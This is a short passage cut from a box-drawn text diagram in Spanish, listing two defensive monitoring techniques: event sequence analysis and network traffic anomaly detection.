│    • Análisis de secuencias de eventos                                      │
│    • Detección de anomalías en tráfico                                      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```
